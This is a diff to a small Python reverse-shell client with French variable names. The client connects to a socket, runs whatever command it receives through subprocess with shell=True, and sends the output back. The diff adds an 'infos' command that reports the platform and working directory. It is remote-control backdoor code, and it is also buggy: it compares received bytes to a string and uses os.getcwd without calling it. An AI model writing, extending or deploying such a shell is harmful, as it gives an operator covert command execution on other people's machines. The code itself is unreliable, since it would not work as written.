@@ -1,9 +1,11 @@
 
 
-
+import os
+import imp
 import socket
 import time
 import subprocess
+import platform
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -25,14 +27,23 @@ while 1:
 while 1:
     commande = s.recv(MAX_DATA_SIZE)   
     print("Commande ", commande.decode())
-    reponse = commande.decode()
-    resultat = subprocess.run(reponse, shell=True, capture_output=True, universal_newlines=True)
-    data_to_send = resultat.stdout + resultat.stderr
+
+
+    if commande == "infos":
+        data_to_send = platform.platform() + " " + os.getcwd
+    else:
+        reponse = commande.decode()
+        resultat = subprocess.run(reponse, shell=True, capture_output=True, universal_newlines=True)
+        data_to_send = resultat.stdout + resultat.stderr
+        if not data_to_send or len(data_to_send)==0:
+            data_to_send = " "
+    
+    
     header = str(len(data_to_send.encode())).zfill(13)
     print("header", header)
     s.sendall(header.encode())
     s.sendall(data_to_send.encode())
-    
+
 #    if recieve_data:
 #        print(recieve_data.decode())       
 #    else:
